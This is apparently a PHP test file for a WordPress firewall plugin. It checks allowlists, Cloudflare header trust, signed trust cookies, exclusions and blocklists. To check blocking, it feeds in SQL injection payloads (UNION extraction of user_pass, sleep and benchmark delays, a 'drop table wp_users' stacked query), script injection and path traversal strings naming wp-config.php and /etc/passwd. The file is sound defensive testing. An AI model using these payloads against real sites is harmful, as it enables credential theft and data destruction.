$ok( 'block' === $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '198.51.101.1' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall: an address next to the allowlisted /24 still gets inspected' );

// Cloudflare: the header counts only from a Cloudflare connection.
$pfw_v = $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '173.245.48.10', 'HTTP_CF_CONNECTING_IP' => '198.51.100.9' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'allowlist' === $pfw_v['reason'] && '198.51.100.9' === $pfw_v['ip'], 'firewall: CF-Connecting-IP from a Cloudflare range names the visitor' );
$pfw_v = $pfw_run( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.9', 'HTTP_CF_CONNECTING_IP' => '198.51.100.9' ), 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'block' === $pfw_v['action'] && '203.0.113.9' === $pfw_v['ip'], 'firewall: a spoofed CF-Connecting-IP from outside Cloudflare is ignored' );

$pfw_ex               = $pfw_cfg;
$pfw_ex['exclusions'] = array(
	array( 'rule' => 'sqli-005', 'path' => '/wp-json/my-plugin/', 'param' => 'q' ),
	array( 'rule' => 'xss', 'path' => '/wp-admin/admin-ajax.php', 'param' => '' ),
);
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: a rule id excluded for one path and parameter passes there' );
$ok( 'block' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'other' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: the same payload in another parameter still blocks' );
$ok( 'block' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/elsewhere/', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['action'], 'firewall exclusions: the same payload on another path still blocks' );
$ok( 'sqli-003' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-json/my-plugin/v1/find', 'get' => array( 'q' => "1' OR '1'='1' AND SLEEP(5)" ) ) )['rule'], 'firewall exclusions: an excluded rule never hides a second rule in the same value' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_ex, 'uri' => '/wp-admin/admin-ajax.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'html' => '<script>x</script>' ) ) )['action'], 'firewall exclusions: a category excluded on a path covers every parameter there' );

/* ---------- trust cookie ---------- */

$pfw_key  = $pfw_cfg['key'];
$pfw_tok  = array( $pfw_token );
$pfw_good = Perdita_Firewall::trust_value( 7, time() + 600, $pfw_key, $pfw_token );
$ok( 7 === Perdita_Firewall::verify_trust( $pfw_good, $pfw_key, null, $pfw_tok ), 'firewall trust: a signed cookie verifies to its user id next to its session token' );
$ok( false === Perdita_Firewall::verify_trust( $pfw_good, str_repeat( 'b', 64 ), null, $pfw_tok ), 'firewall trust: a cookie signed with another key fails' );
$ok( false === Perdita_Firewall::verify_trust( Perdita_Firewall::trust_value( 7, time() - 1, $pfw_key, $pfw_token ), $pfw_key, null, $pfw_tok ), 'firewall trust: an expired cookie fails' );
$pfw_parts    = explode( '.', $pfw_good );
$pfw_parts[0] = '1';
$ok( false === Perdita_Firewall::verify_trust( implode( '.', $pfw_parts ), $pfw_key, null, $pfw_tok ), 'firewall trust: changing the user id breaks the signature' );
$pfw_parts    = explode( '.', $pfw_good );
$pfw_parts[1] = (string) ( (int) $pfw_parts[1] + 999999 );
$ok( false === Perdita_Firewall::verify_trust( implode( '.', $pfw_parts ), $pfw_key, null, $pfw_tok ), 'firewall trust: extending the expiry breaks the signature' );
$ok( false === Perdita_Firewall::verify_trust( '1.9999999999.' . str_repeat( '0', 64 ), $pfw_key, null, $pfw_tok ) && false === Perdita_Firewall::verify_trust( $pfw_good, '', null, $pfw_tok ), 'firewall trust: a forged signature or an empty key fails' );
$ok( 'block' === $pfw_run( array( 'cookie' => array( Perdita_Firewall::TRUST_COOKIE => '1.9999999999.' . str_repeat( 'a', 64 ) ) + $pfw_li, 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall trust: the engine never trusts a cookie it can\'t verify' );

// Review finding 4: a trust cookie works only beside the login session it was signed for.
$ok( false === Perdita_Firewall::verify_trust( $pfw_good, $pfw_key ), 'firewall trust: a trust cookie without a wordpress_logged_in_* session token never verifies' );
$ok( false === Perdita_Firewall::verify_trust( $pfw_good, $pfw_key, null, array( 'Other' . str_repeat( 'x', 38 ) ) ), 'firewall trust: a trust cookie replayed beside another session token fails' );
$pfw_replay = array( Perdita_Firewall::TRUST_COOKIE => $pfw_trust[ Perdita_Firewall::TRUST_COOKIE ] );
$pfw_v      = $pfw_run( array( 'cookie' => $pfw_replay, 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'block' === $pfw_v['action'] && false === $pfw_v['trusted'], 'firewall trust: a replayed trust cookie with no logged-in cookie (after logout) blocks' );
$pfw_v = $pfw_run( array( 'cookie' => $pfw_replay + array( 'wordpress_logged_in_x' => 'admin|1|Fresh' . str_repeat( 'y', 38 ) . '|' . str_repeat( 'd', 64 ) ), 'get' => array( 'id' => "1' OR '1'='1" ) ) );
$ok( 'block' === $pfw_v['action'], 'firewall trust: a replayed trust cookie beside a new session blocks' );
$ok( false === Perdita_Firewall::verify_trust( Perdita_Firewall::trust_value( 7, time() + 13 * DAY_IN_SECONDS, $pfw_key, $pfw_token ), $pfw_key, null, $pfw_tok ), 'firewall trust: an expiry past the one-hour lifetime never verifies, even with a good signature' );
$ok( 3600 === Perdita_Firewall::TRUST_TTL && 7 === Perdita_Firewall::verify_trust( Perdita_Firewall::trust_value( 7, time() + 3600, $pfw_key, $pfw_token ), $pfw_key, null, $pfw_tok ), 'firewall trust: a fresh one-hour cookie verifies' );
$ok( array( $pfw_token ) === Perdita_Firewall::session_tokens( $pfw_li + array( 'wordpress_logged_in_bad' => 'a|b|c', 'other' => 'x|y|' . $pfw_token . '|z' ) ), 'firewall trust: session_tokens() reads the token from wordpress_logged_in_* cookies only' );

$pfw_admins = get_users( array( 'role' => 'administrator', 'number' => 1, 'fields' => 'ID' ) );
$pfw_admin  = $pfw_admins ? (int) $pfw_admins[0] : 0;
$pfw_sub    = wp_insert_user( array( 'user_login' => 'perdita_smoke_fw_sub', 'user_email' => 'perdita-smoke-fw-sub@example.com', 'user_pass' => wp_generate_password(), 'role' => 'subscriber' ) );
$pfw_cookie_before = isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ) ? $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] : null;
$pfw_val = Perdita_Firewall_Config::maybe_set_trust_cookie( $pfw_admin, $pfw_token );
$ok( $pfw_admin > 0 && $pfw_admin === Perdita_Firewall::verify_trust( $pfw_val, Perdita_Firewall_Config::key(), null, $pfw_tok ), 'firewall trust: an administrator gets a cookie the engine verifies' );
$ok( '' === Perdita_Firewall_Config::maybe_set_trust_cookie( is_int( $pfw_sub ) ? $pfw_sub : 0, $pfw_token ), 'firewall trust: a subscriber gets no trust cookie under edit_posts' );
$ok( '' === Perdita_Firewall_Config::maybe_set_trust_cookie( $pfw_admin, '' ), 'firewall trust: no session token, no trust cookie' );

// Sliding renewal on init, and the cookie goes away with the capability or the login.
$pfw_user_before  = get_current_user_id();
$pfw_li_name      = LOGGED_IN_COOKIE;
$pfw_li_before    = isset( $_COOKIE[ $pfw_li_name ] ) ? $_COOKIE[ $pfw_li_name ] : null;
$pfw_meta_before  = get_user_meta( $pfw_admin, 'session_tokens', true );
$pfw_session      = WP_Session_Tokens::get_instance( $pfw_admin );
$pfw_session_tok  = $pfw_session->create( time() + HOUR_IN_SECONDS );
$_COOKIE[ $pfw_li_name ] = wp_generate_auth_cookie( $pfw_admin, time() + HOUR_IN_SECONDS, 'logged_in', $pfw_session_tok );
wp_set_current_user( $pfw_admin );
unset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] );
Perdita_Firewall_Config::refresh_trust_cookie();
$pfw_new = isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ) ? $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] : '';
$ok( $pfw_admin === Perdita_Firewall::verify_trust( $pfw_new, Perdita_Firewall_Config::key(), null, array( $pfw_session_tok ) ), 'firewall trust: init issues a cookie bound to the signed-in session' );
Perdita_Firewall_Config::refresh_trust_cookie();
$ok( $pfw_new === $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ], 'firewall trust: init leaves a fresh cookie alone (no Set-Cookie on every page)' );
$_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] = Perdita_Firewall::trust_value( $pfw_admin, time() + 600, Perdita_Firewall_Config::key(), $pfw_session_tok );
Perdita_Firewall_Config::refresh_trust_cookie();
$pfw_parts = explode( '.', (string) $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] );
$ok( (int) $pfw_parts[1] >= time() + 3500, 'firewall trust: init reissues a cookie older than 15 minutes for another hour' );
$_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] = Perdita_Firewall::trust_value( $pfw_admin, time() + 3600, str_repeat( 'e', 64 ), $pfw_session_tok );
Perdita_Firewall_Config::refresh_trust_cookie();
$ok( $pfw_admin === Perdita_Firewall::verify_trust( (string) $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ], Perdita_Firewall_Config::key(), null, array( $pfw_session_tok ) ), 'firewall trust: init replaces a cookie signed with an old key' );
if ( is_int( $pfw_sub ) ) {
	wp_set_current_user( $pfw_sub );
	Perdita_Firewall_Config::refresh_trust_cookie();
	$ok( ! isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ), 'firewall trust: init clears the cookie for a user without the capability' );
}
$_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] = $pfw_new;
wp_set_current_user( 0 );
Perdita_Firewall_Config::refresh_trust_cookie();
$ok( ! isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ), 'firewall trust: init clears the cookie for a visitor who isn\'t signed in' );
$pfw_session->destroy( $pfw_session_tok );
if ( '' === $pfw_meta_before ) {
	delete_user_meta( $pfw_admin, 'session_tokens' );
} else {
	update_user_meta( $pfw_admin, 'session_tokens', $pfw_meta_before );
}
if ( null === $pfw_li_before ) {
	unset( $_COOKIE[ $pfw_li_name ] );
} else {
	$_COOKIE[ $pfw_li_name ] = $pfw_li_before;
}
wp_set_current_user( $pfw_user_before );
Perdita_Firewall_Config::clear_trust_cookie();
$ok( ! isset( $_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] ), 'firewall trust: logout clears the cookie' );
if ( null !== $pfw_cookie_before ) {
	$_COOKIE[ Perdita_Firewall::TRUST_COOKIE ] = $pfw_cookie_before;
}
if ( is_int( $pfw_sub ) ) {
	wp_delete_user( $pfw_sub );
}

/* ---------- review regressions ---------- */

// Finding 1: UNION SELECT ... FROM with an alias, from(table), or a quoted table.
foreach ( array(
	'-1 union select user_pass from(wp_users)',
	'-1 union select user_pass from wp_users x',
	"-1 union select user_pass from wp_users\nwhere id=1",
	'-1 union select user_login,user_pass from wp_users x',
	'-1 union select user_pass from wordpress.wp_users x',
	'-1 union select user_pass from `wp_users` x',
	'-1 UNION ALL SELECT user_pass FROM wp_users u',
	'-1 union distinct select(user_pass)from(wp_users)',
	'-1 union select user_pass from wp_users limit 1',
) as $pfw_payload ) {
	$pfw_v = $pfw_run( array( 'get' => array( 'id' => $pfw_payload ) ) );
	$ok( 'block' === $pfw_v['action'] && 'sqli' === $pfw_v['category'], 'firewall finding 1: UNION extraction blocks: ' . str_replace( "\n", '\\n', $pfw_payload ) . ( $pfw_v['rule'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
foreach ( array( '1 Union Select Rd', 'Union Select & Sons', 'We select union reps from every shop' ) as $pfw_text ) {
	$ok( 'allow' === $pfw_run( array( 'get' => array( 'q' => $pfw_text ) ) )['action'], 'firewall finding 1: prose passes: ' . $pfw_text );
}

// Finding 2: no depth stops the walk, and a request past the value cap is an anomaly.
foreach ( array( 17, 25, 200 ) as $pfw_depth ) {
	$pfw_deep = "1' or '1'='1";
	for ( $pfw_i = 0; $pfw_i < $pfw_depth; $pfw_i++ ) {
		$pfw_deep = array( 'x' => $pfw_deep );
	}
	$pfw_vp = $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'p' => $pfw_deep ) ) );
	$pfw_vg = $pfw_run( array( 'get' => array( 'p' => $pfw_deep ) ) );
	$ok( 'sqli-005' === $pfw_vp['rule'] && 'sqli-005' === $pfw_vg['rule'], 'firewall finding 2: a payload ' . $pfw_depth . ' levels deep blocks in POST and GET' );
}
$pfw_json = "\"1' or '1'='1\"";
for ( $pfw_i = 0; $pfw_i < 100; $pfw_i++ ) {
	$pfw_json = '{"x":' . $pfw_json . '}';
}
$pfw_jsrv = array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' );
$ok( 'sqli-005' === $pfw_run( array( 'server' => $pfw_jsrv, 'body' => $pfw_json ) )['rule'], 'firewall finding 2: a JSON payload 100 levels deep blocks (decoded to depth 512)' );
$pfw_json = str_repeat( '[', 600 ) . '1' . str_repeat( ']', 600 );
$pfw_v    = $pfw_run( array( 'server' => $pfw_jsrv, 'body' => $pfw_json ) );
$ok( 'anomaly-001' !== $pfw_v['rule'] && 'anomaly-002' === $pfw_v['rule'] && 'block' === $pfw_v['action'], 'firewall finding 2: JSON deeper than 512 levels blocks as anomaly-002' );
$pfw_json = wp_json_encode( array( 'content' => "1' or '1'='1", 'pad' => str_repeat( 'a', 300000 ) ) );
$ok( 'sqli-005' === $pfw_run( array( 'server' => $pfw_jsrv, 'body' => $pfw_json ) )['rule'], 'firewall finding 2: a JSON body over 256 KB decodes and blocks' );
$pfw_many = array_fill( 0, Perdita_Firewall::LEAF_CAP + 5, 'ok' );
$pfw_v    = $pfw_run( array( 'server' => $pfw_jsrv, 'body' => wp_json_encode( array( 'list' => $pfw_many ) ) ) );
$ok( 'anomaly-001' === $pfw_v['rule'] && 'block' === $pfw_v['action'] && 'json:list' === $pfw_v['field'], 'firewall finding 2: a request past ' . Perdita_Firewall::LEAF_CAP . ' values blocks as anomaly-001' );
$ok( 'monitor' === $pfw_run( array( 'config' => $pfw_monitor, 'server' => $pfw_jsrv, 'body' => wp_json_encode( array( 'list' => $pfw_many ) ) ) )['action'], 'firewall finding 2: monitor mode logs anomaly-001 and lets it through' );
$pfw_form = array();
for ( $pfw_i = 0; $pfw_i < 900; $pfw_i++ ) {
	$pfw_form[ 'attribute_' . $pfw_i ] = array( 'name' => 'Size ' . $pfw_i, 'values' => array( 'Small', 'Medium', 'Large' ) );
}
$ok( 'allow' === $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => $pfw_form ) )['action'], 'firewall finding 2: a 900-attribute WooCommerce-style form passes' );
$ok( 'anomaly' === Perdita_Firewall::category_of( 'anomaly-001' ), 'firewall finding 2: anomaly ids map to the anomaly category' );

// Finding 3: time delays with a nested paren or a function argument.
foreach ( array( '1 and sleep((5))', '1 and sleep(pi())', '1 and sleep( (5) )', '1 and benchmark((5000000),md5(1))', '1;select pg_sleep((5))', '1 and sleep(@d)', "1;waitfor delay ('0:0:5')", '1 and benchmark(power(10,7),md5(1))' ) as $pfw_payload ) {
	$pfw_v = $pfw_run( array( 'get' => array( 'id' => $pfw_payload ) ) );
	$ok( 'block' === $pfw_v['action'], 'firewall finding 3: time delay blocks: ' . $pfw_payload . ( $pfw_v['rule'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
foreach ( array( 'I need sleep (lots of it) before the benchmark (see results).', 'Sleep apnea: a benchmark of CPAP machines' ) as $pfw_text ) {
	$ok( 'allow' === $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'message' => $pfw_text ) ) )['action'], 'firewall finding 3: prose passes: ' . $pfw_text );
}

// Finding 5: built-in exclusions for the search box and the comment field.
$ok( 'allow' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => 'what is php://filter' ) ) )['action'], 'firewall finding 5: a search for "what is php://filter" passes' );
$ok( 'allow' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => '../wp-config.php and /etc/passwd' ) ) )['action'], 'firewall finding 5: a search naming ../wp-config.php passes' );
$ok( 'allow' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => "' OR '1'='1" ) ) )['action'], 'firewall finding 5: a search holding a tautology passes' );
$ok( 'block' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => '-1 union select user_pass from wp_users x' ) ) )['action'], 'firewall finding 5: a UNION extraction in the search box still blocks' );
$ok( 'block' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => '1 and sleep(5)' ) ) )['action'], 'firewall finding 5: a time delay in the search box still blocks' );
$ok( 'block' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => "1'; drop table wp_users--" ) ) )['action'], 'firewall finding 5: a stacked query in the search box still blocks' );
$ok( 'block' === $pfw_run( array( 'uri' => '/', 'get' => array( 's' => '<script>alert(1)</script>' ) ) )['action'], 'firewall finding 5: a script in the search box still blocks' );
$pfw_comment = function ( $text, $uri = '/wp-comments-post.php' ) use ( $pfw_run ) {
	return $pfw_run( array( 'uri' => $uri, 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'comment' => $text, 'comment_post_ID' => '5' ) ) );
};
$ok( 'allow' === $pfw_comment( "Try ' OR '1'='1 in the login box and you'll see why prepared statements matter." )['action'], 'firewall finding 5: a logged-out comment with \' OR \'1\'=\'1 passes' );
$ok( 'allow' === $pfw_comment( 'Never let a download link take ../wp-config.php or /etc/passwd.' )['action'], 'firewall finding 5: a comment naming ../wp-config.php passes' );
$ok( 'block' === $pfw_comment( "1' and sleep(5)-- x" )['action'] && 'block' === $pfw_comment( '-1 union select user_pass from wp_users x' )['action'], 'firewall finding 5: UNION and time-delay SQL in a comment still block' );
$ok( 'block' === $pfw_comment( "' OR '1'='1", '/contact/' )['action'], 'firewall finding 5: the comment exclusion applies on wp-comments-post.php only' );
$ok( 'block' === $pfw_run( array( 'uri' => '/wp-comments-post.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'author' => "' OR '1'='1", 'comment' => 'hi there' ) ) )['action'], 'firewall finding 5: other comment form fields keep every rule' );

// Finding 5: a signed-in visitor's block waits for init.
$pfw_editor = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/posts/42',
		'server' => $pfw_jsrv,
		'cookie' => $pfw_li,
		'body'   => wp_json_encode( array( 'content' => "<!-- wp:code --><pre class=\"wp-block-code\"><code>SELECT 1 UNION SELECT user_pass FROM wp_users;</code></pre><!-- /wp:code -->" ) ),
	)
);
$pfw_jsrv_full = $pfw_server( '/wp-json/wp/v2/posts/42', $pfw_jsrv );
$ok( 'block' === $pfw_editor['action'] && Perdita_Firewall::should_defer( $pfw_editor, $pfw_cfg, $pfw_li, $pfw_jsrv_full, 'plugin' ), 'firewall finding 5: a block editor save with SQL in a code block, a logged-in cookie, and no trust cookie waits for init' );
$ok( ! Perdita_Firewall::should_defer( $pfw_editor, $pfw_cfg, array(), $pfw_jsrv_full, 'plugin' ), 'firewall finding 5: with no logged-in cookie the block is immediate' );
$pfw_mon = $pfw_editor;
$pfw_mon['action'] = 'monitor';
$ok( ! Perdita_Firewall::should_defer( $pfw_mon, $pfw_cfg, $pfw_li, $pfw_jsrv_full, 'plugin' ), 'firewall finding 5: monitor mode never defers' );
$pfw_ipv = $pfw_editor;
$pfw_ipv['category'] = 'ip_blocklist';
$ok( ! Perdita_Firewall::should_defer( $pfw_ipv, $pfw_cfg, $pfw_li, $pfw_jsrv_full, 'plugin' ), 'firewall finding 5: an IP, country, rate, probe, or scanner block never waits' );
$ok( Perdita_Firewall::should_defer( $pfw_editor, $pfw_cfg, $pfw_li, array( 'SCRIPT_FILENAME' => ABSPATH . 'index.php' ), 'prepend' ), 'firewall finding 5: before WordPress, a request for index.php defers' );
$ok( Perdita_Firewall::entry_point( $pfw_cfg, array( 'SCRIPT_FILENAME' => ABSPATH . 'wp-admin/post.php' ) ) && Perdita_Firewall::entry_point( $pfw_cfg, array( 'SCRIPT_FILENAME' => ABSPATH . 'wp-comments-post.php' ) ), 'firewall finding 5: wp-admin screens and wp-comments-post.php count as WordPress entry points' );
$ok( ! Perdita_Firewall::should_defer( $pfw_editor, $pfw_cfg, $pfw_li, array( 'SCRIPT_FILENAME' => WP_CONTENT_DIR . '/plugins/x/ajax.php' ), 'prepend' ) && ! Perdita_Firewall::entry_point( $pfw_cfg, array( 'SCRIPT_FILENAME' => ABSPATH . 'wp-admin/load-scripts.php' ) ) && ! Perdita_Firewall::entry_point( $pfw_cfg, array( 'SCRIPT_FILENAME' => '/tmp/other/index.php' ) ), 'firewall finding 5: before WordPress, a direct hit on a plugin file (or any script that never fires init) blocks at once' );
$pfw_logcfg2            = $pfw_cfg;
$pfw_logcfg2['log_dir'] = Perdita_Firewall_Config::log_dir();
wp_mkdir_p( $pfw_logcfg2['log_dir'] );
$pfw_logfile2 = $pfw_logcfg2['log_dir'] . gmdate( 'Y-m-d' ) . '.log.php';
$pfw_size     = is_file( $pfw_logfile2 ) ? filesize( $pfw_logfile2 ) : 0;
Perdita_Firewall::defer( $pfw_logcfg2, $pfw_editor, $pfw_jsrv_full );
$ok( Perdita_Firewall::has_pending() && Perdita_Firewall::REST_SETTLE_PRIORITY === has_filter( 'rest_authentication_errors', array( 'Perdita_Firewall', 'settle_rest' ) ) && false === has_action( 'init', array( 'Perdita_Firewall', 'settle' ) ), 'firewall finding 5: defer() keeps a REST verdict and settles it on rest_authentication_errors, after the REST API knows the user' );
$pfw_v = Perdita_Firewall::resolve_pending( true );
clearstatcache();
$ok( 'allow' === $pfw_v['action'] && true === $pfw_v['trusted'] && ( is_file( $pfw_logfile2 ) ? filesize( $pfw_logfile2 ) : 0 ) === $pfw_size && ! Perdita_Firewall::has_pending(), 'firewall finding 5: a user with the trust capability gets through and nothing is logged' );
Perdita_Firewall::defer( $pfw_logcfg2, $pfw_editor, $pfw_jsrv_full );
$pfw_v = Perdita_Firewall::resolve_pending( false );
clearstatcache();
$pfw_last = is_file( $pfw_logfile2 ) ? json_decode( (string) array_slice( file( $pfw_logfile2, FILE_IGNORE_NEW_LINES ), -1 )[0], true ) : null;
$ok( 'block' === $pfw_v['action'] && 403 === $pfw_v['status'] && is_array( $pfw_last ) && $pfw_editor['rule'] === $pfw_last['rule'] && 'block' === $pfw_last['action'] && $pfw_v['ref'] === $pfw_last['ref'], 'firewall finding 5: anyone else gets the same block and the same log line' );
$pfw_unhook();
$pfw_cap_cfg              = $pfw_logcfg2;
$pfw_cap_cfg['trust_cap'] = 'perdita_smoke_no_such_cap';
Perdita_Firewall::defer( $pfw_cap_cfg, $pfw_editor, $pfw_jsrv_full );
$ok( 'block' === Perdita_Firewall::resolve_pending()['action'], 'firewall finding 5: settle() asks WordPress for the trust capability from the config' );
$pfw_unhook();

// Round 2 finding 4: an editor tab opened before the firewall went on (no
// trust cookie yet) saves a code block with an escaped onclick. The engine
// blocks it on xss-002, and the verdict waits for init, where the editor's
// capability lets it through and init issues the trust cookie.
$pfw_stale = "<!-- wp:paragraph -->\n<p>Here's how to count orders per customer in MySQL, and how to embed the walkthrough video.</p>\n<!-- /wp:paragraph -->\n\n"
	. "<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>SELECT customer_id, COUNT(*) FROM wp_wc_orders o\nWHERE o.status = 'wc-completed'\nGROUP BY customer_id;\n\n&lt;button onclick=\"toggleMenu()\"&gt;Menu&lt;/button&gt;</code></pre>\n<!-- /wp:code -->\n\n"
	. "<!-- wp:html -->\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ\" title=\"Walkthrough\" allowfullscreen></iframe>\n<!-- /wp:html -->\n\n"
	. '<!-- wp:block {"ref":12} /-->';
$pfw_stale_v = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/posts/156',
		'server' => $pfw_jsrv,
		'cookie' => $pfw_li,
		'body'   => wp_json_encode( array( 'title' => 'Counting orders per customer', 'content' => $pfw_stale, 'status' => 'publish' ) ),
	)
);
$ok( 'block' === $pfw_stale_v['action'] && 'xss' === $pfw_stale_v['category'] && Perdita_Firewall::should_defer( $pfw_stale_v, $pfw_cfg, $pfw_li, $pfw_jsrv_full, 'plugin' ), 'firewall R2-4: the stale-tab editor save (' . $pfw_stale_v['rule'] . ' on an escaped onclick) waits for init instead of a 403' );
Perdita_Firewall::defer( $pfw_cfg, $pfw_stale_v, $pfw_jsrv_full );
$ok( 'allow' === Perdita_Firewall::resolve_pending( true )['action'], 'firewall R2-4: an editor with the trust capability saves it' );
$pfw_unhook();

// Finding 6: exclusions match on a path segment boundary.
$pfw_seg               = $pfw_cfg;
$pfw_seg['exclusions'] = array( array( 'rule' => 'sqli-005', 'path' => '/wp-json/myplugin', 'param' => '' ) );
$pfw_q                 = array( 'q' => "1' OR '1'='1" );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_seg, 'uri' => '/wp-json/myplugin', 'get' => $pfw_q ) )['action'] && 'allow' === $pfw_run( array( 'config' => $pfw_seg, 'uri' => '/wp-json/myplugin/v1/x', 'get' => $pfw_q ) )['action'], 'firewall finding 6: an exclusion covers its own path and the paths below it' );
$ok( 'block' === $pfw_run( array( 'config' => $pfw_seg, 'uri' => '/wp-json/myplugin-evil/v1/x', 'get' => $pfw_q ) )['action'], 'firewall finding 6: an exclusion on /wp-json/myplugin never covers /wp-json/myplugin-evil' );
$ok( Perdita_Firewall::path_covers( '/', '/anything' ) && Perdita_Firewall::path_covers( '', '/anything' ) && Perdita_Firewall::path_covers( '/a/', '/a/b' ) && ! Perdita_Firewall::path_covers( '/a/', '/ab' ), 'firewall finding 6: path_covers() handles the root, an empty path, and a trailing slash' );
$ok( '/wp-json/my-plugin' === Perdita_Firewall::exclusion_path( '/WP-JSON//my-plugin/./?x=1#top' ) && '/' === Perdita_Firewall::exclusion_path( '/' ) && '/a/b' === Perdita_Firewall::exclusion_path( 'a/%62/' ), 'firewall finding 6: exclusion_path() normalizes case, slashes, encoding, and the query' );

// Finding 7: every compile writes a new trust key.
add_filter( 'option_perdita_core', $pfw_mod7 = function ( $value ) {
	$value                        = is_array( $value ) ? $value : array();
	$value['modules']['security'] = true;
	return $value;
} );
add_filter( 'pre_option_perdita_security_settings', $pfw_fw_on = function () use ( $pfw_settings ) {
	return array_merge( $pfw_settings, array( 'firewall_load' => 'plugin' ) );
} );
Perdita_Firewall_Config::compile();
$pfw_k1 = get_option( Perdita_Firewall_Config::KEY_OPTION );
Perdita_Firewall_Config::compile();
$pfw_k2   = get_option( Perdita_Firewall_Config::KEY_OPTION );
$pfw_disk = is_file( Perdita_Firewall_Config::config_path() ) ? include Perdita_Firewall_Config::config_path() : array();
$ok( preg_match( '/^[0-9a-f]{64}$/', (string) $pfw_k2 ) && $pfw_k1 !== $pfw_k2 && isset( $pfw_disk['key'] ) && $pfw_k2 === $pfw_disk['key'], 'firewall finding 7: each compile writes a new trust key to the option and config.php' );
$ok( false === Perdita_Firewall::verify_trust( Perdita_Firewall::trust_value( 1, time() + 600, $pfw_k1, $pfw_token ), $pfw_k2, null, $pfw_tok ), 'firewall finding 7: a cookie signed before the compile stops verifying' );
remove_filter( 'pre_option_perdita_security_settings', $pfw_fw_on );
remove_filter( 'option_perdita_core', $pfw_mod7 );
Perdita_Firewall_Config::delete_file( Perdita_Firewall_Config::config_path() );

/* ---------- Pro sections ---------- */

$pfw_pro = Perdita_Firewall_Config::build( $pfw_settings, true );
$pfw_add = function ( $config ) {
	$config['ip_blocklist']   = array( '203.0.113.128/25', '2001:db8:bad::/48' );
	$config['ip_allowlist'][] = '203.0.113.200';
	$config['custom_rules']   = array(
		array( 'id' => 'r1', 'field' => 'header:X-Debug', 'op' => 'equals', 'value' => 'on', 'action' => 'block', 'enabled' => true ),
		array( 'id' => 'r2', 'field' => 'uri', 'op' => 'starts', 'value' => '/partner-api/', 'action' => 'allow', 'enabled' => true ),
		array( 'id' => 'r3', 'field' => 'query', 'op' => 'regex', 'value' => '^promo-[0-9]+$', 'action' => 'log', 'enabled' => true ),
		array( 'id' => 'r4', 'field' => 'ip', 'op' => 'equals', 'value' => '203.0.113.60/31', 'action' => 'block', 'enabled' => true ),
		array( 'id' => 'r5', 'field' => 'user_agent', 'op' => 'contains', 'value' => 'evilbot', 'action' => 'block', 'enabled' => false ),
	);
	$config['country']        = array( 'mode' => 'block', 'countries' => array( 'KP' ), 'scope' => 'site', 'trust_server' => false );
	$config['rate_limits']    = array( array( 'route' => 'login', 'limit' => 5, 'action' => 'block', 'block_minutes' => 10 ) );
	return $config;
};
add_filter( 'perdita_firewall_config', $pfw_add );
$pfw_pro = Perdita_Firewall_Config::build( $pfw_settings, true );
remove_filter( 'perdita_firewall_config', $pfw_add );
$ok( ! empty( $pfw_pro['blocklist']['v4'] ) && ! empty( $pfw_pro['blocklist']['v6'] ), 'firewall Pro: the compiler parses ip_blocklist from the perdita_firewall_config filter' );
$pfw_prun = function ( $req ) use ( $pfw_run, $pfw_pro ) {
	$req['config'] = $pfw_pro;
	return $pfw_run( $req );
};
$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.130' ) ) )['rule'], 'firewall Pro: a blocklisted IPv4 address blocks' );
$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '2001:db8:bad:1::1' ) ) )['rule'], 'firewall Pro: a blocklisted IPv6 range blocks' );
